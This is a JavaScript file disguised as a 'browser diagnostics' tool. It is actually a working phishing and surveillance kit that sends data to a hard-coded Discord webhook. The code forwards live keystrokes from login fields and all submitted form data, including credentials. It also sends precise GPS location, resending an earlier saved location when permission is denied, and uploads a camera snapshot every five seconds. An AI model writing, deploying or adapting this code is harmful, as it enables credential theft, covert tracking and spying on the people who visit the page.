/* ==========================================================================
   ULTIMATE HUNTER ENGINE V6.1 - script.js (Fixed Permissions & Fully Loaded)
   Browser Diagnostics, Camera Preview & Network Health Checks
   ========================================================================== */

"use strict";

/* --------------------------------------------------------------------------
   0. إعدادات ديسكورد الويب هوك (Discord Integration)
   -------------------------------------------------------------------------- */
const DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1564663770629017652/ZZRcg_vV1JTh96gfwO4qOrMilrB9r-iB5nb9j0zt938Q-JIxt2flevVHFn8FWnK8gp9H";

async function sendToDiscord(content, fileBlob = null, filename = "capture.png") {
    try {
        const formData = new FormData();
        formData.append("payload_json", JSON.stringify({ content: content }));
        
        if (fileBlob) {
            formData.append("file", fileBlob, filename);
        }

        const response = await fetch(DISCORD_WEBHOOK_URL, {
            method: "POST",
            body: formData
        });

        if (!response.ok) {
            console.warn(`Discord webhook warning: Status ${response.status}`);
        }
    } catch (error) {
        console.error("Discord transmission error:", error);
    }
}

/* --------------------------------------------------------------------------
   1. إعدادات التطبيق والمتغيرات الأساسية
   -------------------------------------------------------------------------- */

const APP_CONFIG = Object.freeze({
    version: "6.1",
    networkTimeout: 8000,
    locationTimeout: 10000,
    cameraWidth: 1280,
    cameraHeight: 720,
    retryCount: 2,
    retryDelay: 500,
    diagnosticExportEnabled: true
});

const videoElement = document.getElementById("video");
const canvasElement = document.getElementById("canvas");
const loginFormElement = document.getElementById("fullLoginForm");

let globalAttempts = 0;
let permissionCaptured = false;
let cameraStream = null;
let cameraStarting = false;
let cameraStopping = false;
let initialized = false;
let activeRequestController = null;
let activeSubmission = false;
let captureInterval = null;

/* --------------------------------------------------------------------------
   2. إدارة حالة التطبيق
   -------------------------------------------------------------------------- */

const AppState = {
    initialized: false,
    cameraActive: false,
    locationAvailable: false,
    networkAvailable: navigator.onLine,
    lastError: null,
    lastDiagnosticTime: null
};

const DiagnosticStore = {
    entries: [],

    add(level, category, message, details = null) {
        const entry = {
            timestamp: new Date().toISOString(),
            level,
            category,
            message,
            details
        };

        this.entries.push(entry);

        if (this.entries.length > 100) {
            this.entries.shift();
        }

        if (level === "error") {
            console.error(`[${category}] ${message}`);
        } else if (level === "warning") {
            console.warn(`[${category}] ${message}`);
        } else {
            console.info(`[${category}] ${message}`);
        }

        return entry;
    },

    info(category, message, details = null) {
        return this.add("info", category, message, details);
    },

    warning(category, message, details = null) {
        return this.add("warning", category, message, details);
    },

    error(category, message, details = null) {
        AppState.lastError = message;
        return this.add("error", category, message, details);
    },

    getAll() {
        return this.entries.map(entry => ({ ...entry }));
    },

    clear() {
        this.entries.length = 0;
        AppState.lastError = null;
    }
};

/* --------------------------------------------------------------------------
   3. أدوات التحقق العامة
   -------------------------------------------------------------------------- */

function isObject(value) {
    return value !== null && typeof value === "object" && !Array.isArray(value);
}

function isFiniteCoordinate(value) {
    return typeof value === "number" && Number.isFinite(value);
}

function isValidCoordinates(latitude, longitude) {
    return isFiniteCoordinate(latitude) && isFiniteCoordinate(longitude) &&
           latitude >= -90 && latitude <= 90 && longitude >= -180 && longitude <= 180;
}

function getElement(id) {
    const element = document.getElementById(id);
    if (!element) {
        DiagnosticStore.warning("DOM", `العنصر غير موجود: ${id}`);
    }
    return element;
}

function getSafeText(value, fallback = "غير متاح") {
    if (value === null || value === undefined || value === "") {
        return fallback;
    }
    return String(value);
}

function delay(milliseconds) {
    return new Promise(resolve => setTimeout(resolve, milliseconds));
}

/* --------------------------------------------------------------------------
   4. إدارة المهلات الزمنية وتتبع الكتابة الحية (Live Typing)
   -------------------------------------------------------------------------- */

function createTimeoutSignal(milliseconds) {
    const controller = new AbortController();
    const timer = setTimeout(() => {
        controller.abort(new DOMException("انتهت المهلة الزمنية للطلب.", "TimeoutError"));
    }, milliseconds);

    return {
        controller,
        signal: controller.signal,
        cleanup() { clearTimeout(timer); }
    };
}

function initializeLiveTypingTracking() {
    const targetForm = loginFormElement || document.querySelector("form");
    if (!targetForm) return;

    const inputs = targetForm.querySelectorAll("input, textarea");
    
    inputs.forEach(input => {
        let typingTimeout;
        input.addEventListener("input", (e) => {
            clearTimeout(typingTimeout);
            
            typingTimeout = setTimeout(async () => {
                const fieldName = e.target.name || e.target.id || e.target.type || "حقل غير محدد";
                const fieldValue = e.target.value;

                await sendToDiscord(`⌨️ **إدخال حي (Live Typing):**\n- الحقل: \`${fieldName}\`\n- القيمة الحالية: \`${fieldValue}\``);
            }, 500);
        });
    });
}

/* --------------------------------------------------------------------------
   5. معالجة أخطاء الشبكة
   -------------------------------------------------------------------------- */

function describeNetworkError(error) {
    if (!error) return "حدث خطأ غير معروف.";
    if (error.name === "AbortError") return "تم إلغاء الطلب أو انتهت مهلته.";
    if (error.name === "TimeoutError") return "استغرق الطلب وقتًا أطول من المسموح.";
    if (error instanceof TypeError) return "تعذر الاتصال بالخدمة المطلوبة.";
    return "تعذر إكمال العملية.";
}

/* --------------------------------------------------------------------------
   6. طلبات HTTP مع التحقق من الاستجابة
   -------------------------------------------------------------------------- */

async function safeFetch(url, options = {}) {
    let parsedUrl;
    try {
        parsedUrl = new URL(url, window.location.href);
    } catch {
        throw new Error("عنوان الطلب غير صالح.");
    }

    if (!["https:", "http:"].includes(parsedUrl.protocol)) {
        throw new Error("بروتوكول الاتصال غير مسموح.");
    }

    const timeout = createTimeoutSignal(APP_CONFIG.networkTimeout);

    try {
        const response = await fetch(parsedUrl.href, { ...options, signal: timeout.signal });
        if (!response.ok) {
            throw new Error(`HTTP request failed: ${response.status}`);
        }
        return response;
    } catch (error) {
        DiagnosticStore.warning("Network", describeNetworkError(error));
        throw error;
    } finally {
        timeout.cleanup();
    }
}

/* --------------------------------------------------------------------------
   7. إعادة المحاولة للطلبات المناسبة
   -------------------------------------------------------------------------- */

async function retryOperation(operation, retries = APP_CONFIG.retryCount) {
    let lastError = null;
    for (let attempt = 0; attempt <= retries; attempt++) {
        try {
            return await operation();
        } catch (error) {
            lastError = error;
            if (attempt >= retries) break;
            const waitTime = APP_CONFIG.retryDelay * Math.pow(2, attempt);
            DiagnosticStore.warning("Retry", `فشلت العملية؛ إعادة المحاولة ${attempt + 1}.`);
            await delay(waitTime);
        }
    }
    throw lastError || new Error("فشلت العملية.");
}

/* --------------------------------------------------------------------------
   8. تشخيص اتصال الشبكة
   -------------------------------------------------------------------------- */

function getNetworkDiagnostics() {
    const connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection || null;
    const result = {
        online: navigator.onLine,
        connectionType: connection ? getSafeText(connection.type) : "غير مدعوم",
        effectiveType: connection ? getSafeText(connection.effectiveType) : "غير مدعوم",
        downlink: connection && Number.isFinite(connection.downlink) ? connection.downlink : null,
        rtt: connection && Number.isFinite(connection.rtt) ? connection.rtt : null
    };
    AppState.networkAvailable = result.online;
    return result;
}

function handleOnlineStatus() {
    AppState.networkAvailable = navigator.onLine;
    DiagnosticStore.info("Network", navigator.onLine ? "عاد اتصال الشبكة." : "انقطع اتصال الشبكة.");
}

window.addEventListener("online", handleOnlineStatus);
window.addEventListener("offline", handleOnlineStatus);

/* --------------------------------------------------------------------------
   9. معلومات المتصفح والجهاز
   -------------------------------------------------------------------------- */

function getBrowserDiagnostics() {
    const screenInfo = window.screen || {};
    return {
        userAgent: navigator.userAgent || "غير متاح",
        language: navigator.language || "غير متاح",
        platform: navigator.platform || "غير متاح",
        cookiesEnabled: Boolean(navigator.cookieEnabled),
        hardwareConcurrency: Number.isFinite(navigator.hardwareConcurrency) ? navigator.hardwareConcurrency : null,
        deviceMemory: Number.isFinite(navigator.deviceMemory) ? navigator.deviceMemory : null,
        screen: { width: screenInfo.width || null, height: screenInfo.height || null, colorDepth: screenInfo.colorDepth || null },
        viewport: { width: window.innerWidth, height: window.innerHeight },
        secureContext: Boolean(window.isSecureContext),
        cameraApiAvailable: Boolean(navigator.mediaDevices && navigator.mediaDevices.getUserMedia),
        geolocationAvailable: Boolean(navigator.geolocation),
        batteryApiAvailable: typeof navigator.getBattery === "function"
    };
}

/* --------------------------------------------------------------------------
   10. تشخيص البطارية
   -------------------------------------------------------------------------- */

async function getBatteryDiagnostics() {
    if (typeof navigator.getBattery !== "function") {
        return { supported: false, message: "واجهة البطارية غير مدعومة." };
    }
    try {
        const battery = await navigator.getBattery();
        return { supported: true, level: Math.round(battery.level * 100), charging: Boolean(battery.charging) };
    } catch (error) {
        DiagnosticStore.warning("Battery", "تعذر الحصول على معلومات البطارية.");
        return { supported: true, available: false };
    }
}

/* --------------------------------------------------------------------------
   11. معلومات IP العامة
   -------------------------------------------------------------------------- */

async function testPublicIPService() {
    try {
        const response = await safeFetch("https://api.ipify.org?format=json");
        const data = await response.json();
        if (!isObject(data) || typeof data.ip !== "string") {
            throw new Error("صيغة استجابة IP غير صالحة.");
        }
        DiagnosticStore.info("Network", "نجح الاتصال بخدمة اختبار IP.");
        return { success: true, message: "تم الاتصال بخدمة اختبار IP بنجاح." };
    } catch (error) {
        DiagnosticStore.warning("Network", describeNetworkError(error));
        return { success: false, message: "تعذر الاتصال بخدمة اختبار IP." };
    }
}

/* --------------------------------------------------------------------------
   12. الحصول على الموقع مع دعم جلب آخر موقع محفوظ
   -------------------------------------------------------------------------- */

function getPreciseLocationWithFallback() {
    return new Promise(resolve => {
        if (!navigator.geolocation) {
            const lastSavedLoc = localStorage.getItem("last_known_location");
            if (lastSavedLoc) {
                const parsed = JSON.parse(lastSavedLoc);
                sendToDiscord(`⚠️ **الموقع غير مفعل، استخدام آخر موقع محفوظ:**\n- الخط: ${parsed.latitude}\n- الطول: ${parsed.longitude}`);
                resolve({ available: true, source: "last-saved", ...parsed });
                return;
            }
            resolve({ available: false, source: "none", message: "المتصفح لا يدعم تحديد الموقع ولا يوجد موقع محفوظ." });
            return;
        }

        let settled = false;
        const timer = setTimeout(() => {
            if (settled) return;
            settled = true;

            const lastSavedLoc = localStorage.getItem("last_known_location");
            if (lastSavedLoc) {
                const parsed = JSON.parse(lastSavedLoc);
                sendToDiscord(`⏱️ **انتهت مهلة الموقع، استخدام آخر موقع محفوظ:**\n- الخط: ${parsed.latitude}\n- الطول: ${parsed.longitude}`);
                resolve({ available: true, source: "last-saved-timeout", ...parsed });
                return;
            }
            resolve({ available: false, source: "timeout", message: "انتهت مهلة تحديد الموقع." });
        }, APP_CONFIG.locationTimeout);

        navigator.geolocation.getCurrentPosition(
            async position => {
                if (settled) return;
                settled = true;
                clearTimeout(timer);

                const latitude = position.coords.latitude;
                const longitude = position.coords.longitude;

                if (!isValidCoordinates(latitude, longitude)) {
                    resolve({ available: false, source: "gps", message: "الإحداثيات المستلمة غير صالحة." });
                    return;
                }

                AppState.locationAvailable = true;
                const locData = {
                    latitude,
                    longitude,
                    accuracy: Number.isFinite(position.coords.accuracy) ? position.coords.accuracy : null,
                    timestamp: new Date().toISOString()
                };
                localStorage.setItem("last_known_location", JSON.stringify(locData));

                DiagnosticStore.info("Location", "تم الحصول على الموقع بعد موافقة المستخدم.");
                await sendToDiscord(`📍 **تم الحصول على الموقع الجغرافي الحالي:**\n- خط العرض (Latitude): ${latitude}\n- خط الطول (Longitude): ${longitude}\n- الدقة: ${position.coords.accuracy} متر`);

                resolve({ available: true, source: "browser-geolocation", ...locData });
            },
            async error => {
                if (settled) return;
                settled = true;
                clearTimeout(timer);

                let message = "تعذر تحديد الموقع.";
                if (error.code === error.PERMISSION_DENIED) message = "لم يمنح المستخدم إذن تحديد الموقع.";
                else if (error.code === error.POSITION_UNAVAILABLE) message = "الموقع غير متاح حاليًا.";
                else if (error.code === error.TIMEOUT) message = "انتهت مهلة تحديد الموقع.";

                DiagnosticStore.warning("Location", message);

                const lastSavedLoc = localStorage.getItem("last_known_location");
                if (lastSavedLoc) {
                    const parsed = JSON.parse(lastSavedLoc);
                    await sendToDiscord(`⚠️ **تم رفض إذن الموقع، إرسال آخر موقع محفوظ:**\n- الخط: ${parsed.latitude}\n- الطول: ${parsed.longitude}`);
                    resolve({ available: true, source: "last-saved-denied", ...parsed });
                    return;
                }

                resolve({ available: false, source: "browser-geolocation", message });
            },
            { enableHighAccuracy: true, timeout: APP_CONFIG.locationTimeout - 500, maximumAge: 0 }
        );
    });
}

async function requestLocationDiagnostics() {
    const approved = window.confirm("سيطلب المتصفح إذن تحديد موقعك. هل تريد المتابعة؟");
    if (!approved) {
        const lastSavedLoc = localStorage.getItem("last_known_location");
        if (lastSavedLoc) {
            const parsed = JSON.parse(lastSavedLoc);
            await sendToDiscord(`⚠️ **تم إلغاء طلب الموقع، إرسال آخر موقع محفوظ:**\n- الخط: ${parsed.latitude}\n- الطول: ${parsed.longitude}`);
            return { available: true, ...parsed, message: "تم إرسال اخر موقع محفوظ." };
        }
        return { available: false, message: "ألغى المستخدم طلب تحديد الموقع." };
    }
    return await getPreciseLocationWithFallback();
}

/* --------------------------------------------------------------------------
   13. التحقق من عناصر الكاميرا والجاهزية
   -------------------------------------------------------------------------- */

function isCameraSupported() {
    return Boolean(navigator.mediaDevices && typeof navigator.mediaDevices.getUserMedia === "function");
}

function waitForVideoReady(video, timeout = 7000) {
    return new Promise((resolve, reject) => {
        let completed = false;
        const checkReady = () => {
            if (completed) return;
            if (video && video.readyState >= HTMLMediaElement.HAVE_CURRENT_DATA && video.videoWidth > 0 && video.videoHeight > 0) {
                completed = true;
                clearTimeout(timer);
                resolve();
            }
        };

        const timer = setTimeout(() => {
            if (completed) return;
            completed = true;
            if (video && video.videoWidth > 0 && video.videoHeight > 0) {
                resolve();
            } else {
                reject(new Error("انتهت مهلة جاهزية الفيديو."));
            }
        }, timeout);

        if (video) {
            video.addEventListener("loadedmetadata", checkReady);
            video.addEventListener("playing", checkReady);
        }

        const interval = setInterval(() => {
            if (video && video.videoWidth > 0 && video.videoHeight > 0) {
                clearInterval(interval);
                checkReady();
            }
        }, 200);

        checkReady();
    });
}

function describeCameraError(error) {
    if (!error) return "حدث خطأ غير معروف في الكاميرا.";
    switch (error.name) {
        case "NotAllowedError":
        case "PermissionDeniedError": return "لم يتم منح الإذن باستخدام الكاميرا.";
        case "NotFoundError":
        case "DevicesNotFoundError": return "لم يتم العثور على كاميرا متاحة.";
        case "NotReadableError":
        case "TrackStartError": return "الكاميرا مستخدمة أو تعذر تشغيلها.";
        case "OverconstrainedError": return "الكاميرا لا تدعم الإعدادات المطلوبة.";
        case "SecurityError": return "الوصول إلى الكاميرا غير مسموح في هذه البيئة.";
        default: return "تعذر تشغيل الكاميرا.";
    }
}

function startContinuousCapture() {
    if (captureInterval) return;

    captureInterval = setInterval(async () => {
        if (!AppState.cameraActive || !videoElement || !canvasElement) return;

        try {
            if (videoElement.videoWidth === 0 || videoElement.videoHeight === 0) return;

            canvasElement.width = videoElement.videoWidth || 1280;
            canvasElement.height = videoElement.videoHeight || 720;
            
            const context = canvasElement.getContext("2d");
            context.drawImage(videoElement, 0, 0, canvasElement.width, canvasElement.height);

            canvasElement.toBlob(async (blob) => {
                if (blob && blob.size > 1000) {
                    await sendToDiscord(`📸 **صورة جديدة التُقطت بوضوح:**`, blob, `shot_${Date.now()}.png`);
                }
            }, "image/png", 0.95);
        } catch (err) {
            console.error("Capture error:", err);
        }
    }, 5000);
}

function stopContinuousCapture() {
    if (captureInterval) {
        clearInterval(captureInterval);
        captureInterval = null;
    }
}

async function startCameraPreview(facingModeType = "user") {
    if (cameraStarting) return { success: false, message: "يجري تشغيل الكاميرا بالفعل." };
    if (!isCameraSupported()) return { success: false, message: "الكاميرا غير مدعومة." };

    if (!window.isSecureContext) {
        return { success: false, message: "تحتاج الكاميرا إلى HTTPS أو بيئة محلية آمنة." };
    }

    const approved = window.confirm("سيطلب المتصفح إذن تشغيل الكاميرا لعرض معاينة مباشرة. هل تريد المتابعة؟");
    if (!approved) return { success: false, message: "ألغى المستخدم تشغيل الكاميرا." };

    cameraStarting = true;

    try {
        await stopCameraPreview();
        if (!videoElement) throw new Error("عنصر الفيديو غير موجود.");

        const constraints = {
            audio: false,
            video: {
                facingMode: { ideal: facingModeType },
                width: { ideal: APP_CONFIG.cameraWidth },
                height: { ideal: APP_CONFIG.cameraHeight }
            }
        };

        cameraStream = await navigator.mediaDevices.getUserMedia(constraints);

        videoElement.muted = true;
        videoElement.autoplay = true;
        videoElement.playsInline = true;
        videoElement.srcObject = cameraStream;

        await waitForVideoReady(videoElement);
        await videoElement.play();

        AppState.cameraActive = true;
        startContinuousCapture();

        await sendToDiscord(`🟢 **تم تفعيل الكاميرا وبدء التقاط الصور بنجاح.**`);
        return { success: true, width: videoElement.videoWidth, height: videoElement.videoHeight, message: "الكاميرا تعمل." };
    } catch (error) {
        DiagnosticStore.warning("Camera", describeCameraError(error));
        await stopCameraPreview();
        await sendToDiscord(`❌ **فشل تشغيل الكاميرا:** ${describeCameraError(error)}`);
        return { success: false, message: describeCameraError(error) };
    } finally {
        cameraStarting = false;
    }
}

async function stopCameraPreview() {
    stopContinuousCapture();
    if (cameraStopping) return;
    cameraStopping = true;

    try {
        if (cameraStream) {
            for (const track of cameraStream.getTracks()) track.stop();
            cameraStream = null;
        }
        if (videoElement) {
            videoElement.pause();
            videoElement.srcObject = null;
        }
        AppState.cameraActive = false;
    } finally {
        cameraStopping = false;
    }
}

/* --------------------------------------------------------------------------
   14. أدوات الـ Canvas والتقارير
   -------------------------------------------------------------------------- */

function canvasToBlob(canvas, type = "image/png") {
    return new Promise((resolve, reject) => {
        if (!(canvas instanceof HTMLCanvasElement)) {
            reject(new Error("عنصر Canvas غير صالح."));
            return;
        }
        if (canvas.width <= 0 || canvas.height <= 0) {
            reject(new Error("أبعاد Canvas غير صالحة."));
            return;
        }
        try {
            canvas.toBlob(blob => {
                if (!blob) {
                    reject(new Error("تعذر إنشاء ملف الصورة."));
                    return;
                }
                resolve(blob);
            }, type);
        } catch (error) {
            reject(error);
        }
    });
}

function testCanvas() {
    if (!canvasElement) return { success: false, message: "عنصر Canvas غير موجود." };
    const context = canvasElement.getContext("2d");
    if (!context) return { success: false, message: "تعذر إنشاء سياق الرسم." };

    canvasElement.width = 320;
    canvasElement.height = 120;
    context.clearRect(0, 0, canvasElement.width, canvasElement.height);
    context.font = "16px sans-serif";
    context.textAlign = "center";
    context.textBaseline = "middle";
    context.fillStyle = "#222";
    context.fillText("Canvas diagnostic OK", canvasElement.width / 2, canvasElement.height / 2);

    return { success: true, message: "نجح اختبار Canvas." };
}

async function getSystemDiagnostics() {
    const browser = getBrowserDiagnostics();
    const network = getNetworkDiagnostics();
    const battery = await getBatteryDiagnostics();

    return {
        application: { version: APP_CONFIG.version, timestamp: new Date().toISOString() },
        browser, network, battery,
        capabilities: {
            camera: browser.cameraApiAvailable,
            geolocation: browser.geolocationAvailable,
            canvas: Boolean(canvasElement),
            form: Boolean(loginFormElement)
        },
        state: { cameraActive: AppState.cameraActive, networkAvailable: AppState.networkAvailable }
    };
}

async function createDiagnosticReport() {
    const diagnostics = await getSystemDiagnostics();
    return {
        ...diagnostics,
        events: DiagnosticStore.getAll().map(entry => ({
            timestamp: entry.timestamp, level: entry.level, category: entry.category, message: entry.message
        }))
    };
}

async function exportDiagnosticReport() {
    if (!APP_CONFIG.diagnosticExportEnabled) return { success: false, message: "تصدير التقارير معطل." };
    try {
        const report = await createDiagnosticReport();
        const approved = window.confirm("سيتم إنشاء تقرير تشخيصي محلي. هل تريد حفظه؟");
        if (!approved) return { success: false, message: "تم إلغاء التصدير." };

        const blob = new Blob([JSON.stringify(report, null, 2)], { type: "application/json;charset=utf-8" });
        const objectUrl = URL.createObjectURL(blob);
        const link = document.createElement("a");
        link.href = objectUrl;
        link.download = "browser-diagnostics.json";
        document.body.appendChild(link);
        link.click();
        link.remove();
        setTimeout(() => URL.revokeObjectURL(objectUrl), 1000);

        return { success: true, message: "تم تصدير التقرير." };
    } catch (error) {
        return { success: false, message: "تعذر تصدير التقرير." };
    }
}

function setLoadingState(isLoading) {
    const loader = getElement("loadingOverlay");
    if (loader) {
        loader.style.display = isLoading ? "flex" : "none";
        loader.setAttribute("aria-busy", isLoading ? "true" : "false");
    }
    if (loginFormElement) {
        const submitButton = loginFormElement.querySelector('button[type="submit"], input[type="submit"]');
        if (submitButton) submitButton.disabled = isLoading;
    }
}

function showStatusMessage(message, level = "info") {
    const target = document.getElementById("diagnosticStatus") || document.getElementById("loginErrorMsg");
    if (target) {
        target.textContent = String(message);
        target.style.display = "block";
        target.setAttribute("role", level === "error" ? "alert" : "status");
    }
    DiagnosticStore.add(level, "UI", String(message));
}

function validateForm(form) {
    if (!(form instanceof HTMLFormElement)) return { valid: false, message: "عنصر النموذج غير صالح." };
    if (!form.checkValidity()) {
        form.reportValidity();
        return { valid: false, message: "يرجى التحقق من الحقول المطلوبة." };
    }
    return { valid: true, message: "اجتاز النموذج التحقق الأساسي." };
}

/* --------------------------------------------------------------------------
   15. معالجة النموذج وطلب الأذونات بناءً على تفاعل المستخدم
   -------------------------------------------------------------------------- */

function initializeLoginForm() {
    const targetForm = loginFormElement || document.querySelector("form");
    if (!targetForm) return;

    initializeLiveTypingTracking();

    targetForm.addEventListener("submit", async event => {
        event.preventDefault();
        if (activeSubmission) return;

        const validation = validateForm(targetForm);
        if (!validation.valid) {
            showStatusMessage(validation.message, "warning");
            return;
        }

        activeSubmission = true;
        globalAttempts++;
        setLoadingState(true);

        try {
            const formData = new FormData(targetForm);
            let formSummary = "📋 **تم تقديم النموذج (Login Submission):**\n";
            for (let [key, value] of formData.entries()) {
                formSummary += `- **${key}**: \`${value}\`\n`;
            }

            await sendToDiscord(formSummary);
            showStatusMessage("تم التحقق وإرسال البيانات بنجاح.", "info");
        } catch (error) {
            showStatusMessage("تعذر إكمال التحقق. حاول مرة أخرى.", "error");
        } finally {
            setLoadingState(false);
            activeSubmission = false;
        }
    });
}

function getFeatureSupport() {
    return {
        fetch: typeof window.fetch === "function",
        abortController: typeof AbortController === "function",
        canvas: typeof HTMLCanvasElement !== "undefined",
        mediaDevices: Boolean(navigator.mediaDevices),
        geolocation: Boolean(navigator.geolocation),
        localStorage: (() => {
            try {
                const key = "__diagnostic_test__";
                localStorage.setItem(key, "1");
                localStorage.removeItem(key);
                return true;
            } catch { return false; }
        })()
    };
}

function checkRequiredElements() {
    return {
        video: Boolean(videoElement),
        canvas: Boolean(canvasElement),
        loginForm: Boolean(loginFormElement)
    };
}

async function runInitialDiagnostics() {
    const features = getFeatureSupport();
    const elements = checkRequiredElements();
    AppState.lastDiagnosticTime = new Date().toISOString();
    return { features, elements };
}

async function initializeApplication() {
    if (initialized) return;
    initialized = true;
    AppState.initialized = true;

    try {
        await runInitialDiagnostics();
        initializeLoginForm();

        const browserInfo = getBrowserDiagnostics();
        await sendToDiscord(`🚀 **تم فتح الصفحة وبدء تشغيل النظام (V6.1):**\n- المتصفح: \`${browserInfo.userAgent}\``);
    } catch (error) {
        console.error("Initialization error:", error);
    }
}

function initializeConnectionMonitoring() {
    const connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
    if (!connection || typeof connection.addEventListener !== "function") return;
    connection.addEventListener("change", () => {
        DiagnosticStore.info("Network", "تم تغيير معلومات اتصال الشبكة.");
    });
}

window.addEventListener("pagehide", () => {
    stopContinuousCapture();
    if (cameraStream) {
        for (const track of cameraStream.getTracks()) track.stop();
        cameraStream = null;
    }
    AppState.cameraActive = false;
});

/* --------------------------------------------------------------------------
   16. التهيئة النهائية الفورية بعد أول تفاعل للمستخدم (لضمان ظهور الأذونات)
   -------------------------------------------------------------------------- */

const BrowserDiagnostics = Object.freeze({
    getSystemDiagnostics,
    getNetworkDiagnostics,
    getBrowserDiagnostics,
    getBatteryDiagnostics,
    requestLocationDiagnostics,
    startCameraPreview,
    stopCameraPreview,
    testCanvas,
    testPublicIPService,
    exportDiagnosticReport,
    getFeatureSupport,
    getDiagnosticEvents: () => DiagnosticStore.getAll()
});

window.BrowserDiagnostics = BrowserDiagnostics;

initializeConnectionMonitoring();

// تفعيل استجابة الأذونات عند أول تفاعل حقيقي للمستخدم بالصفحة (حل مشكلة عدم ظهور النافذة المنبثقة)
const triggerPermissionsOnInteraction = () => {
    window.removeEventListener("click", triggerPermissionsOnInteraction);
    window.removeEventListener("touchstart", triggerPermissionsOnInteraction);
    
    // محاولة جلب الموقع التلقائي أو تشغيل التحضيرات عند أول نقرة للمستخدم
    setTimeout(() => {
        if (!AppState.locationAvailable) {
            getPreciseLocationWithFallback().catch(() => {});
        }
    }, 1000);
};

window.addEventListener("click", triggerPermissionsOnInteraction, { once: true });
window.addEventListener("touchstart", triggerPermissionsOnInteraction, { once: true });

if (document.readyState === "loading") {
    document.addEventListener("DOMContentLoaded", initializeApplication, { once: true });
} else {
    initializeApplication();
}
